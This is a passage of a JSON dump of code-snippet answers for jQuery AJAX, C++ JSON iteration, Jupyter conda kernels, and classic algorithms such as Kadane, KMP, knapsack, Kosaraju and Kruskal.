    "description": "1234567891011121314151617181920212223             // form ajax with multiple json complex types            $('#btnFormAjaxJsonMultipleComplexTypes').on('click', function () {                 var joe = { FirstName: 'Joe' };                var jane = { FirstName: 'Jane' };                var data = { one: joe, two: jane };                 $.ajax({                    url: '@Url.Action(\"CreateAjaxFormJsonMultipleComplexType\")',                    type: 'POST',                    beforeSend: function (xhr) {                        xhr.setRequestHeader(\"RequestVerificationToken\",                            $('input:hidden[name=\"__RequestVerificationToken\"]').val());                    },                    dataType: 'json',                    contentType: 'application/json; charset=utf-8',                    data: JSON.stringify(data)                }).done(function (result) {                    alert(result.Count)                });             });<div class=\"open_grepper_editor\" title=\"Edit & Save To Grepper\"></div>\n",
    "reg_date": "2021-10-12T11:41:46.000Z"
  },
  {
    "id": 2901,
    "keyword": null,
    "link": null,
    "title": " json::iterator c++",
    "description": "for (auto it = RecentFiles.begin(); it != RecentFiles.end(); ++it) {     std::cout << it.key() << \"\\n\";     std::cout << (*it)[\"Name\"].get<std::string>() << \"\\n\";     std::cout << (*it)[\"Last modified\"].get<std::string>() << \"\\n\"; } \n",
    "reg_date": "2021-10-12T11:41:46.000Z"
  },
  {
    "id": 2902,
    "keyword": null,
    "link": null,
    "title": " jump to case label c++",
    "description": "put everything in the case x: under {} brackets metti tutto quello nel case x: sotto le parentesi {}\n",
    "reg_date": "2021-10-12T11:41:47.000Z"
  },
  {
    "id": 2903,
    "keyword": null,
    "link": null,
    "title": " jupyter lab use conda environment",
    "description": "$ conda activate cenv (cenv)$ conda install ipykernel (cenv)$ ipython kernel install --user --name=<any_name_for_kernel> (cenv($ conda deactivate \nsource activate myenv python -m ipykernel install --user --name myenv --display-name \"Python (myenv)\"\n",
    "reg_date": "2021-10-12T11:41:47.000Z"
  },
  {
    "id": 2904,
    "keyword": null,
    "link": null,
    "title": " k stacks",
    "description": "//Program in C++ to implement k stacks in an array  #include <iostream> using namespace std;  class kstack{   int *s; //stack   int *index; //prev occupied and next available indexes of stack   int *top_of_stack; //top of every stack   int next_available; //next available index      public:   //initialize every value   kstack(int capacity,int number_of_stacks){       s = new int[capacity];       index = new int[capacity];       top_of_stack = new int[number_of_stacks];       next_available = 0;              for(int i=0;i<capacity;i++)           index[i] = (i != capacity-1)?i+1 : -1;              for(int i=0;i<number_of_stacks;i++)           top_of_stack[i] = -1;   }      void push(int,int); //push given element to given stack no.   void pop(int); //pop an element from given stack no. };  void kstack::push(int stack_num,int value){     if(next_available == -1){         cout<<\"All Stacks overflowed\\n\";         return;     }          int free_index = index[next_available];          //set new value     s[next_available] = value;          //set prev index for current stack's top index     index[next_available] = top_of_stack[stack_num];          //set top of stack to curr index     top_of_stack[stack_num] = next_available;          //set next next_available to next free index     next_available = free_index;          cout<<\"Element pushed successfully\\n\"; }  void kstack::pop(int stack_num){     int top_index = top_of_stack[stack_num];          if(top_index == -1)          cout<<\"Stack \"<<stack_num<<\" is empty!\\n\";          int top_element = s[top_of_stack[stack_num]];     cout<<top_element<<\" poped\\n\";          //set top of stack to prev top of stack     top_of_stack[stack_num] = index[top_index];          //set index to point to next available index     index[top_index] = next_available;          //set next available to current poped index     next_available = top_index; }  int main() {     //instantiate kstack \tkstack s(6,3); \t//push elements to respective given stack \ts.push(0,2); \ts.push(0,15); \ts.push(2,10); \ts.push(1,4); \ts.pop(0); \ts.push(2,3); \ts.pop(2); \ts.push(2,5); \ts.push(2,6); \ts.push(3,7); \ts.push(2,8); //whole stack array is full at this point \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:47.000Z"
  },
  {
    "id": 2905,
    "keyword": null,
    "link": null,
    "title": " k stacks in an array",
    "description": "//Program in C++ to implement k stacks in an array  #include <iostream> using namespace std;  class kstack{   int *s; //stack   int *index; //prev occupied and next available indexes of stack   int *top_of_stack; //top of every stack   int next_available; //next available index      public:   //initialize every value   kstack(int capacity,int number_of_stacks){       s = new int[capacity];       index = new int[capacity];       top_of_stack = new int[number_of_stacks];       next_available = 0;              for(int i=0;i<capacity;i++)           index[i] = (i != capacity-1)?i+1 : -1;              for(int i=0;i<number_of_stacks;i++)           top_of_stack[i] = -1;   }      void push(int,int); //push given element to given stack no.   void pop(int); //pop an element from given stack no. };  void kstack::push(int stack_num,int value){     if(next_available == -1){         cout<<\"All Stacks overflowed\\n\";         return;     }          int free_index = index[next_available];          //set new value     s[next_available] = value;          //set prev index for current stack's top index     index[next_available] = top_of_stack[stack_num];          //set top of stack to curr index     top_of_stack[stack_num] = next_available;          //set next next_available to next free index     next_available = free_index;          cout<<\"Element pushed successfully\\n\"; }  void kstack::pop(int stack_num){     int top_index = top_of_stack[stack_num];          if(top_index == -1)          cout<<\"Stack \"<<stack_num<<\" is empty!\\n\";          int top_element = s[top_of_stack[stack_num]];     cout<<top_element<<\" poped\\n\";          //set top of stack to prev top of stack     top_of_stack[stack_num] = index[top_index];          //set index to point to next available index     index[top_index] = next_available;          //set next available to current poped index     next_available = top_index; }  int main() {     //instantiate kstack \tkstack s(6,3); \t//push elements to respective given stack \ts.push(0,2); \ts.push(0,15); \ts.push(2,10); \ts.push(1,4); \ts.pop(0); \ts.push(2,3); \ts.pop(2); \ts.push(2,5); \ts.push(2,6); \ts.push(3,7); \ts.push(2,8); //whole stack array is full at this point \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2906,
    "keyword": null,
    "link": null,
    "title": " kadane's algorithm",
    "description": "//C++ program to find maximum contiguous subarray using dynamic programming  #include <iostream> #include <climits> using namespace std;  void kadane_algo(int arr[],int n){     if(!n) return;          int curr = arr[0],max = arr[0];     for(int i=1;i<n;i++){                  //max sum of subarray ending at pos i         curr = curr+arr[i] > arr[i] ? curr+arr[i] : arr[i];                  //max sum of subarray ending at any pos so far         max = curr > max ? curr : max;     }          cout<<\"Max subarray sum: \"<<max<<endl; }  int main() { \tint arr[] = {-1,-4,-6,-7,-4}; \tint n = sizeof(arr)/sizeof(int); \tkadane_algo(arr,n); \treturn 0; }\npublic int kadane(int[] arr){ \tint max_so_far = 0, curr_max = Integer.MIN_VALUE;     for(int i: arr){     \tmax_so_far += i;         if(max_so_far<0) max_so_far = 0;         if(max_so_far>curr_max) curr_max = max_so_far;     }     return curr_max; }\n#include <bits/stdc++.h>  using namespace std; int max_sumarray(int arr[],int n)//calculate the max sum; it has two parts {     int max_sum;     int cur_sum;     int count=0;     for(int i=0;i<n;i++)     {         if(arr[i]<0)         {             count++;         }     }     if(count!=n)//part 1 when elements are all +ve or +ve and -ve     {         max_sum=0;         cur_sum=0;         for(int i=0;i<n;i++)         {             cur_sum=cur_sum+arr[i];             if(cur_sum>max_sum)             {                 max_sum=cur_sum;             }             if(cur_sum<0)             {                 cur_sum=0;             }         }     }     else if(count==n)//part 2 when all the elements are -ve     {         max_sum=arr[0];         cur_sum=arr[0];         for(int i=1;i<n;i++)         {             cur_sum=max(arr[i],cur_sum+arr[i]);             max_sum=max(cur_sum,max_sum);         }     }     return max_sum; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int max_subarray_sum=max_sumarray(arr,n);     cout<<max_subarray_sum<<endl; } \n/*\tCode by DEVANSH SINGH \t     Kadane's Algorithm \t     Maximum Subarray Sum */ from sys import stdin,setrecursionlimit setrecursionlimit(10**7)  def maxSubarraySum(arr, n) :      curSum = 0     preSum = 0     maxSum = 0     for i in range(n) :          if(i == 0) :             curSum = arr[i]                  else :              curSum = max(arr[i], preSum + arr[i])                  preSum = curSum         maxSum = max(maxSum, curSum)          return maxSum /*\tCode by DEVANSH SINGH */  #taking inpit using fast I/O def takeInput() : \t     n =  int(input())      if(n == 0) :         return list(), n      arr = list(map(int, stdin.readline().strip().split(\" \")))      return arr, n   #main arr, n = takeInput() print(maxSubarraySum(arr, n)) /*\tCode by DEVANSH SINGH */  /*\tCode by DEVANSH SINGH */ /*\tCode by DEVANSH SINGH */ \ndef kadane(inputArray): \tmaxSum = float(\"-inf\") \tcurSum = 0      \tfor x in inputArray:   \t\tcurSum = max(0, curSum + x)   \t\tmaxSum = max(maxSum, curSum) \treturn maxSum\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2907,
    "keyword": null,
    "link": null,
    "title": " kadane's algorithm gfg",
    "description": "//C++ program to find maximum contiguous subarray using dynamic programming  #include <iostream> #include <climits> using namespace std;  void kadane_algo(int arr[],int n){     if(!n) return;          int curr = arr[0],max = arr[0];     for(int i=1;i<n;i++){                  //max sum of subarray ending at pos i         curr = curr+arr[i] > arr[i] ? curr+arr[i] : arr[i];                  //max sum of subarray ending at any pos so far         max = curr > max ? curr : max;     }          cout<<\"Max subarray sum: \"<<max<<endl; }  int main() { \tint arr[] = {-1,-4,-6,-7,-4}; \tint n = sizeof(arr)/sizeof(int); \tkadane_algo(arr,n); \treturn 0; }\npublic int kadane(int[] arr){ \tint max_so_far = 0, curr_max = Integer.MIN_VALUE;     for(int i: arr){     \tmax_so_far += i;         if(max_so_far<0) max_so_far = 0;         if(max_so_far>curr_max) curr_max = max_so_far;     }     return curr_max; }\n#include <bits/stdc++.h>  using namespace std; int max_sumarray(int arr[],int n)//calculate the max sum; it has two parts {     int max_sum;     int cur_sum;     int count=0;     for(int i=0;i<n;i++)     {         if(arr[i]<0)         {             count++;         }     }     if(count!=n)//part 1 when elements are all +ve or +ve and -ve     {         max_sum=0;         cur_sum=0;         for(int i=0;i<n;i++)         {             cur_sum=cur_sum+arr[i];             if(cur_sum>max_sum)             {                 max_sum=cur_sum;             }             if(cur_sum<0)             {                 cur_sum=0;             }         }     }     else if(count==n)//part 2 when all the elements are -ve     {         max_sum=arr[0];         cur_sum=arr[0];         for(int i=1;i<n;i++)         {             cur_sum=max(arr[i],cur_sum+arr[i]);             max_sum=max(cur_sum,max_sum);         }     }     return max_sum; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int max_subarray_sum=max_sumarray(arr,n);     cout<<max_subarray_sum<<endl; } \n/*\tCode by DEVANSH SINGH \t     Kadane's Algorithm \t     Maximum Subarray Sum */ from sys import stdin,setrecursionlimit setrecursionlimit(10**7)  def maxSubarraySum(arr, n) :      curSum = 0     preSum = 0     maxSum = 0     for i in range(n) :          if(i == 0) :             curSum = arr[i]                  else :              curSum = max(arr[i], preSum + arr[i])                  preSum = curSum         maxSum = max(maxSum, curSum)          return maxSum /*\tCode by DEVANSH SINGH */  #taking inpit using fast I/O def takeInput() : \t     n =  int(input())      if(n == 0) :         return list(), n      arr = list(map(int, stdin.readline().strip().split(\" \")))      return arr, n   #main arr, n = takeInput() print(maxSubarraySum(arr, n)) /*\tCode by DEVANSH SINGH */  /*\tCode by DEVANSH SINGH */ /*\tCode by DEVANSH SINGH */ \ndef kadane(inputArray): \tmaxSum = float(\"-inf\") \tcurSum = 0      \tfor x in inputArray:   \t\tcurSum = max(0, curSum + x)   \t\tmaxSum = max(maxSum, curSum) \treturn maxSum\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2908,
    "keyword": null,
    "link": null,
    "title": " kadane algorithm with negative numbers included as sum",
    "description": "//Usually Kadene's algorithm is not considered for negative numbers.      int ms,cs; \t    ms=cs=a[0];  \t    for(int i=1;i<n;i++) \t    { \t        cs=max(a[i],cs+a[i]); \t       ms=max(cs,ms); \t} return ms;\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2909,
    "keyword": null,
    "link": null,
    "title": " kahn's algorithm",
    "description": "//Topological sort using BFS (Kahn's Algorithm) #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v); } void toposort(vector<int>adj[],int n) {     queue<int>q;     vector<int>indegree(n,0);     for(int i=0;i<n;i++)     {         for(auto it: adj[i])         {             indegree[it]++;         }     }     for(int i=0;i<n;i++)     {         if(indegree[i]==0)         {             q.push(i);         }     }vector<int>topo;     while(!q.empty())     {         int node=q.front();         q.pop();         topo.push_back(node);         for(auto it:adj[node])         {             indegree[it]--;             if(indegree[it]==0)             {                 q.push(it);             }         }      }     int si=topo.size();     for(int i=0;i<si;i++)     {         cout<<topo[i]<<\" \";     } } int main() {     int vertex,edges;     cout<<\"Enter the number of vertex and edges:\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"Enter the links:\"<<endl;     for(int i=0;i<vertex;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }    // for(int i=0;i<vertex;i++)     //{         toposort(adj,vertex);     //}      return 0; } \n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2910,
    "keyword": null,
    "link": null,
    "title": " kahoot glitches",
    "description": "This project has received too many requests, please try again later.\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2911,
    "keyword": null,
    "link": null,
    "title": " kiem tra so hoan hao nhanh nhat",
    "description": "bool KTSHT(long long int n) { \tlong long int sum = 1; \tif(n == 1 || n == 0 || n == 2 || n == 3 || n == 4 || n == 5) \t\treturn false; \tfor(long long int i = 2; i * i <= n; i++) \t{ \t\tif(n % i == 0) \t\t{ \t\t\tif(i*i != n) \t\t\t\tsum += i + n/i; \t\t\telse \t\t\t\tsum += i; \t\t} \t} \tif(sum == n && n != 1) \t\treturn true; \treturn false; }\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2912,
    "keyword": null,
    "link": null,
    "title": " kmp algorithm",
    "description": "#include<bits/stdc++.h> using namespace std; void createlps(int lps[],string pattern,int n) {     int i=0;     int j=1;     lps[0]=0;     while(j<n)     {         if(pattern[i]==pattern[j])         {             lps[j]=i+1;             i++;             j++;         }         else         {             if(i!=0)             {                 i=lps[i-1];             }             else             {                 lps[j]=0;                 j++;             }         }     } } void kmp(string str,string pattern,int n,int lps[]) {     int i=0;     int j=0;     int size_of_str=str.size();     while(i<size_of_str)     {         if(pattern[j]==str[i])         {             i++;             j++;         }         if(j==n)         {             cout<<\"Found at:\"<<i-j;             j=lps[j-1];         }         else if(i<size_of_str&&pattern[j]!=str[i])         {             if(j!=0)             {                 j=lps[j-1];             }             else             {                 i++;             }         }     } } int main() {     string str;     cin>>str;     string pattern;     cin>>pattern;     int n=pattern.size();     int lps[n];     createlps(lps,pattern,n);     for(int i=0;i<n;i++)     {         cout<<lps[i]<<\" \";     }     kmp(str,pattern,n,lps);     return 0; } \nvoid computeLPSArray(char* pat, int M, int* lps) {     int len = 0;     lps[0] = 0;     int i = 1;     while (i < M) {         if (pat[i] == pat[len]) {             len++;             lps[i] = len;             i++;         }         else         {             if (len != 0) {                 len = lps[len - 1];             }             else             {                 lps[i] = 0;                 i++;             }         }     } } int matchFound=0; void KMPSearch(char* pat, char* txt) {     matchFound=0;     int M = strlen(pat);     int N = strlen(txt);     int lps[M];     computeLPSArray(pat, M, lps);     int i = 0;     int j = 0;     while (i < N) {         if (pat[j] == txt[i]) {             j++;             i++;         }         if (j == M) {             matchFound++; //            printf(\"Found pattern at index %d \", i - j);             j = lps[j - 1];         }         else if (i < N && pat[j] != txt[i]) {             if (j != 0)                 j = lps[j - 1];             else                 i = i + 1;         }     } }\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2913,
    "keyword": null,
    "link": null,
    "title": " kmp c++",
    "description": "void computeLPSArray(char* pat, int M, int* lps) {     int len = 0;     lps[0] = 0;     int i = 1;     while (i < M) {         if (pat[i] == pat[len]) {             len++;             lps[i] = len;             i++;         }         else         {             if (len != 0) {                 len = lps[len - 1];             }             else             {                 lps[i] = 0;                 i++;             }         }     } } int matchFound=0; void KMPSearch(char* pat, char* txt) {     matchFound=0;     int M = strlen(pat);     int N = strlen(txt);     int lps[M];     computeLPSArray(pat, M, lps);     int i = 0;     int j = 0;     while (i < N) {         if (pat[j] == txt[i]) {             j++;             i++;         }         if (j == M) {             matchFound++; //            printf(\"Found pattern at index %d \", i - j);             j = lps[j - 1];         }         else if (i < N && pat[j] != txt[i]) {             if (j != 0)                 j = lps[j - 1];             else                 i = i + 1;         }     } }\n",
    "reg_date": "2021-10-12T11:41:48.000Z"
  },
  {
    "id": 2914,
    "keyword": null,
    "link": null,
    "title": " knapsack",
    "description": "#include<bits/stdc++.h> using namespace std; vector<pair<int,int> >a; //dp table is full of zeros int n,s,dp[1002][1002]; void ini(){     for(int i=0;i<1002;i++)         for(int j=0;j<1002;j++)             dp[i][j]=-1; } int f(int x,int b){ \t//base solution \tif(x>=n or b<=0)return 0; \t//if we calculate this before, we just return the answer (value diferente of 0) \tif(dp[x][b]!=-1)return dp[x][b]; \t//calculate de answer for x (position) and b(empty space in knapsack) \t//we get max between take it or not and element, this gonna calculate all the \t//posible combinations, with dp we won't calculate what is already calculated. \treturn dp[x][b]=max(f(x+1,b),b-a[x].second>=0?f(x+1,b-a[x].second)+a[x].first:INT_MIN); } int main(){ \t//fast scan and print \tios_base::sync_with_stdio(0);cin.tie(0); \t//we obtain quantity of elements and size of knapsack \tcin>>n>>s; \ta.resize(n); \t//we get value of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].first; \t//we get size of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].second; \t//initialize dp table \tini(); \t//print answer \tcout<<f(0,s); \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:49.000Z"
  },
  {
    "id": 2915,
    "keyword": null,
    "link": null,
    "title": " knapsack problem",
    "description": "def greedy_knapsack(values,weights,capacity):     n = len(values)     def score(i) : return values[i]/weights[i]     items = sorted(range(n)  , key=score , reverse = True)     sel, value,weight = [],0,0     for i in items:         if weight +weights[i] <= capacity:             sel += [i]             weight += weights[i]             value += values [i]     return sel, value, weight   weights = [4,9,10,20,2,1] values = [400,1800,3500,4000,1000,200] capacity = 20  print(greedy_knapsack(values,weights,capacity))\n#Returns the maximum value that can be stored by the bag  def knapSack(W, wt, val, n):    # initial conditions    if n == 0 or W == 0 :       return 0    # If weight is higher than capacity then it is not included    if (wt[n-1] > W):       return knapSack(W, wt, val, n-1)    # return either nth item being included or not    else:       return max(val[n-1] + knapSack(W-wt[n-1], wt, val, n-1),          knapSack(W, wt, val, n-1)) # To test above function val = [50,100,150,200] wt = [8,16,32,40] W = 64 n = len(val) print (knapSack(W, wt, val, n))\n# a dynamic approach # Returns the maximum value that can be stored by the bag def knapSack(W, wt, val, n):    K = [[0 for x in range(W + 1)] for x in range(n + 1)]    #Table in bottom up manner    for i in range(n + 1):       for w in range(W + 1):          if i == 0 or w == 0:             K[i][w] = 0          elif wt[i-1] <= w:             K[i][w] = max(val[i-1] + K[i-1][w-wt[i-1]], K[i-1][w])          else:             K[i][w] = K[i-1][w]    return K[n][W] #Main val = [50,100,150,200] wt = [8,16,32,40] W = 64 n = len(val) print(knapSack(W, wt, val, n))\n// memory efficient and iterative approach to the knapsack problem  #include <bits/stdc++.h> using namespace std;  // n is the number of items // w is the knapsack's capacity int n, w;  int main() { /* input format: n w value_1 cost_1 value_2 cost_2 . . value_n cost_n */     cin >> n >> w;   \tvector<long long> dp(w + 1, 0);      for (int i = 0; i < n; ++i) {         int value, cost;         cin >> value >> cost;         for (int j = w; j >= cost; --j)             dp[j] = max(dp[j], value + dp[j - cost]);     }      // the answer is dp[w]     cout << dp[w]; }\n#include<bits/stdc++.h> using namespace std; vector<pair<int,int> >a; //dp table is full of zeros int n,s,dp[1002][1002]; void ini(){     for(int i=0;i<1002;i++)         for(int j=0;j<1002;j++)             dp[i][j]=-1; } int f(int x,int b){ \t//base solution \tif(x>=n or b<=0)return 0; \t//if we calculate this before, we just return the answer (value diferente of 0) \tif(dp[x][b]!=-1)return dp[x][b]; \t//calculate de answer for x (position) and b(empty space in knapsack) \t//we get max between take it or not and element, this gonna calculate all the \t//posible combinations, with dp we won't calculate what is already calculated. \treturn dp[x][b]=max(f(x+1,b),b-a[x].second>=0?f(x+1,b-a[x].second)+a[x].first:INT_MIN); } int main(){ \t//fast scan and print \tios_base::sync_with_stdio(0);cin.tie(0); \t//we obtain quantity of elements and size of knapsack \tcin>>n>>s; \ta.resize(n); \t//we get value of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].first; \t//we get size of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].second; \t//initialize dp table \tini(); \t//print answer \tcout<<f(0,s); \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:49.000Z"
  },
  {
    "id": 2916,
    "keyword": null,
    "link": null,
    "title": " kosaraju algorithm",
    "description": "// Strongly connected components in a graph using Kosaraju's Algorithm  #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int a,int b) {     adj[a].push_back(b); } void topo(int node,vector<int>adj[],stack<int>&st,vector<int>&visit) {     visit[node]=1;     for(auto i:adj[node])     {         if(!visit[i])         {             topo(i,adj,st,visit);         }     }     st.push(node); } void revdfs(int node,vector<int>&visit,vector<int>transp[]) {     cout<<node<<\" \";     visit[node]=1;     for(auto it:transp[node])     {         if(!visit[it])         {             revdfs(it,visit,transp);         }     } } int main() {     int vertex,edges;     cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"ENTER THE LINKS:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     stack<int>st;     vector<int>visit(vertex,0);     for(int i=0;i<vertex;i++)     {         if(!visit[i])         {             topo(i,adj,st,visit);         }     }     vector<int>transp[vertex];     for(int i=0;i<vertex;i++)     {         visit[i]=0;         for(auto it:adj[i])         {             transp[it].push_back(i);         }     }     while(!st.empty())     {         int node =st.top();         st.pop();         if(!visit[node])         {             cout<<\"SCC\";             revdfs(node,visit,transp);             cout<<endl;         }     }     return 0; } \n//By Soumyadeep Ghosh @soumyadepp on Instagram //Kosaraju's algorithm for Strongly Connected Components /*Kosaraju's algorithm for Finding the number of Strongly Connected Components of a graph works on the fact that on transposing a graph, i.e reversing all it's edges, the strongly connected components are unaffected. This works in three steps:  1)Build a stack for the nodes using dfs. The node to finish the dfs latest shall be on top. 2)Transpose the graph 3)Perform dfs on the elements of the stack starting from top if it is unvisited and keep popping. 4)The number of SCC is merely the number of times DFS was called.  */  #include <bits/stdc++.h>  using namespace std;  //dfs for building the initial stack void dfsHelper(vector<int>*adj,int src,bool visited[],stack<int>&st) { \tvisited[src] = true; \tfor(int i = 0 ; i < adj[src].size(); i++) \t{ \t\tif(!visited[adj[src][i]]) \t\t{ \t\t\tdfsHelper(adj,adj[src][i],visited,st); \t\t} \t} \tst.push(src); }  //dfs for finding connected components of transposed graph void dfs(vector<int>*adj,int src,bool visited[]) { \tvisited[src] = true; \tfor(int i = 0 ; i < adj[src].size();i++) \t{ \t\tif(!visited[adj[src][i]]) \t\t{ \t\t\tdfs(adj,adj[src][i],visited); \t\t} \t} } int main() { \tint t; \tcin>>t; \twhile(t--) \t{ \t\tvector<int>*adj; \t\tstack<int>helperStack; \t\tbool *visited; \t\tint StronglyConnectedComponents = 0; \t\tint n,e; \t\tcin>>n>>e; \t\tvisited = new bool[n + 1]; \t\tadj = new vector<int>[n + 1]; \t\tfor(int i = 0 ; i < e ; i++) \t\t{ \t\t\tint u,v; \t\t\tcin>>u>>v; \t\t\tadj[u].push_back(v); \t\t} \t\t \t\t//mark all the nodes as unvisited  \t\tfor(int i = 0 ; i <= n ; i++) \t\t{ \t\t\tvisited[i] = false; \t\t} \t\t//call dfs for the initial graph \t\tdfsHelper(adj,1,visited,helperStack); \t\t \t\t//make another adjacency list to store the transpose of the graph \t\tvector<int>reversed[n+1]; \t\tfor(int i = 1; i <= n; i++) \t\t{ \t\t\tfor(int j = 0 ; j < adj[i].size(); j++) \t\t\t{ \t\t\t\treversed[adj[i][j]].push_back(i); \t\t\t} \t\t} \t\t//mark all the nodes as unvisited \t\tfor(int i = 0 ; i <= n ; i++) \t\t{ \t\t\tvisited[i] = false; \t\t} \t\t \t\t//starting from the top of the stack go visit every node and perform dfs on it, if it is not visited \t\t//The total number of strongly connected components will be the number of times dfs is called. \t\twhile(!helperStack.empty()) \t\t{ \t\t\tint k = helperStack.top(); \t\t\tif(!visited[k]) \t\t\t{ \t\t\t\tdfs(reversed,k,visited); \t\t\t\tStronglyConnectedComponents++; \t\t\t} \t\t\thelperStack.pop(); \t\t} \t\tcout<<\"The number of  strongly connected Components are \"<<StronglyConnectedComponents<<endl; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:49.000Z"
  },
  {
    "id": 2917,
    "keyword": null,
    "link": null,
    "title": " kruskal's algorithm",
    "description": "#include<bits/stdc++.h>  using namespace std;  int  main() { \tint n = 9; \t \tint mat[9][9] = { \t{100,4,100,100,100,100,100,8,100}, \t{4,100,8,100,100,100,100,100,100}, \t{100,8,100,7,100,4,100,100,2}, \t{100,100,7,100,9,14,100,100,100}, \t{100,100,100,9,100,10,100,100,100}, \t{100,100,4,14,10,100,2,100,100}, \t{100,100,100,100,100,2,100,1,6}, \t{8,100,100,100,100,100,1,100,7}, \t{100,100,2,100,100,100,6,7,100}}; \t \tint parent[n]; \t \tint edges[100][3]; \tint count = 0; \t \tfor(int i=0;i<n;i++) \t\tfor(int j=i;j<n;j++) \t\t{ \t\t\tif(mat[i][j] != 100) \t\t\t{ \t\t\t\tedges[count][0] = i; \t\t\t\tedges[count][1] = j; \t\t\t\tedges[count++][2] = mat[i][j];\t \t\t\t}\t\t \t\t}  \tfor(int i=0;i<count-1;i++) \t\tfor(int j=0;j<count-i-1;j++) \t\t\tif(edges[j][2] > edges[j+1][2]) \t\t\t\t{ \t\t\t\t\tint t1=edges[j][0], t2=edges[j][1], t3=edges[j][2]; \t\t\t\t\t \t\t\t\t\tedges[j][0] = edges[j+1][0]; \t\t\t\t\tedges[j][1] = edges[j+1][1]; \t\t\t\t\tedges[j][2] = edges[j+1][2]; \t\t\t\t\t \t\t\t\t\tedges[j+1][0] = t1; \t\t\t\t\tedges[j+1][1] = t2; \t\t\t\t\tedges[j+1][2] = t3; \t\t\t\t} \t\t\t\t \tint mst[n-1][2]; \tint mstVal = 0; \tint l = 0; \t \tcout<<endl; \t \tfor(int i=0;i<n;i++) \t\tparent[i] = -1; \tcout<<endl; \t\t\t\t \tfor(int i=0;i<count;i++) \t{ \t\tif((parent[edges[i][0]] == -1 && parent[edges[i][1]] == -1)) \t\t{ \t\t\tparent[edges[i][0]] = edges[i][0]; \t\t\tparent[edges[i][1]] = edges[i][0]; \t\t\t \t\t\tmst[l][0] = edges[i][0]; \t\t\tmst[l++][1] = edges[i][1]; \t\t\t \t\t\tmstVal += edges[i][2]; \t\t} \t\t \t\telse if((parent[edges[i][0]] == -1 && parent[edges[i][1]] != -1)) \t\t{ \t\t\tparent[edges[i][0]] = parent[edges[i][1]]; \t\t\t \t\t\tmst[l][0] = edges[i][1]; \t\t\tmst[l++][1] = edges[i][0]; \t\t\t \t\t\tmstVal += edges[i][2]; \t\t} \t\t \t\telse if((parent[edges[i][0]] != -1 && parent[edges[i][1]] == -1)) \t\t{ \t\t\tparent[edges[i][1]] = parent[edges[i][0]]; \t\t\t \t\t\tmst[l][0] = edges[i][0]; \t\t\tmst[l++][1] = edges[i][1]; \t\t\t \t\t\tmstVal += edges[i][2]; \t\t} \t\t \t\telse if(parent[edges[i][0]] != -1 && parent[edges[i][1]] != -1 && parent[edges[i][0]] != parent[edges[i][1]]) \t\t{ \t\t\tint p = parent[edges[i][1]]; \t\t\tfor(int j=0;j<n;j++) \t\t\t\tif(parent[j] == p) \t\t\t\t\tparent[j] = parent[edges[i][0]]; \t\t\t \t\t\tmst[l][0] = edges[i][0]; \t\t\tmst[l++][1] = edges[i][1]; \t\t\t \t\t\tmstVal += edges[i][2]; \t\t} \t} \t \tfor(int i=0;i<l;i++) \t\tcout<<mst[i][0]<<\" -> \"<<mst[i][1]<<endl; \t \tcout<<endl; \tcout<<mstVal<<endl; \t\t \treturn(0); }\nTime complexity:- O(ElogV)\n//MINIMUM SPANNING TREE USING KRUSHKAL ALGORITHM #include<bits/stdc++.h> using namespace std; struct node {     int u,v,wt;     node(int first,int second, int weight)     {         u=first;         v=second;         wt=weight;     } }; bool cmp(node a,node b) {     return (a.wt<b.wt); } int findpar(int u,vector<int>&parent) {     if(u==parent[u])     {         return u;     }     return findpar(parent[u],parent); } void unionoperation(int u,int v,vector<int>&parent,vector<int>&rank) {     u=findpar(u,parent);     v=findpar(v,parent);     if(rank[u]<rank[v])     {         parent[u]=v;     }     else if(rank[v]<rank[u])     {         parent[v]=u;     }     else     {         parent[v]=u;         rank[u]++;     } } int main() {     int vertex,ed;     cout<<\"Enter the number of vertex and edges:\"<<endl;     cin>>vertex>>ed;     vector<node>edges;      cout<<\"enter the links and weight:\"<<endl;     for(int i=0;i<ed;i++)     {         int u,v,wt;         cin>>u>>v>>wt;         edges.push_back(node(u,v,wt));     }     sort(edges.begin(),edges.end(),cmp);     vector<int>parent(vertex);     for(int i=0;i<vertex;i++)     {         parent[i]=i;     }     vector<int>rank(vertex,0);     int cost=0;     vector<pair<int,int>>mst;     for(auto i:edges)     {         if(findpar(i.u,parent)!=findpar(i.v,parent))         {             cost+=i.wt;             mst.push_back(make_pair(i.u,i.v));             unionoperation(i.u,i.v,parent,rank);         }     }     cout<<cost<<endl;     for(auto i:mst)     {         cout<<i.first<<\"-\"<<i.second<<endl;     }     return 0; } \n#include<bits/stdc++.h>  using namespace std;      typedef  pair<int, int> iPair;      struct Graph  {      int V, E;      vector< pair<int, iPair> > edges;             Graph(int 